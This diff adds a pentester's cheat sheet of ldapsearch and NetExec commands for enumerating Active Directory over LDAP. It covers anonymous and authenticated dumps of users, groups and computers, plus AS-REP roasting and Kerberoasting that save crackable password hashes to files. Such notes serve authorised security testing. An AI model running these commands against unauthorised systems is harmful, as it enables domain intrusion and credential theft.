@@ -1,0 +1,34 @@
+% ldap, ad, enum
+
+# Root DSE: naming contexts, defaultNamingContext, hostname
+ldapsearch -H ldap://<ip> -x -s base -b '' namingcontexts defaultNamingContext dnsHostName
+
+# NetExec LDAP banner + null auth check
+nxc ldap <ip>
+
+# Anonymous user list
+nxc ldap <ip> -u '' -p '' --users
+
+# AS-REP roast, anonymous (works only if accounts allow it)
+nxc ldap <ip> -u '' -p '' --asreproast asrep_null.hash
+
+# Users, authenticated
+nxc ldap <ip> -u <user> -p <pass> --users
+
+# Groups, authenticated
+nxc ldap <ip> -u <user> -p <pass> --groups
+
+# Computers (get-network module)
+nxc ldap <ip> -u <user> -p <pass> -M get-network
+
+# AS-REP roast across DONT_REQ_PREAUTH accounts
+nxc ldap <ip> -u <user> -p <pass> --asreproast asrep.hash
+
+# Kerberoast SPN-bound accounts (via nxc)
+nxc ldap <ip> -u <user> -p <pass> --kerberoasting kerberoast.hash
+
+# ldapsearch anonymous dump (edit DC= base)
+ldapsearch -H ldap://<ip> -x -b "DC=<dc1>,DC=<dc2>" "(objectclass=*)" > ldap_anon.ldif
+
+# ldapsearch authenticated user dump
+ldapsearch -H ldap://<ip> -x -D '<user>@<domain>' -w <pass> -b "DC=<dc1>,DC=<dc2>" "(objectClass=user)" > ldap_users.ldif
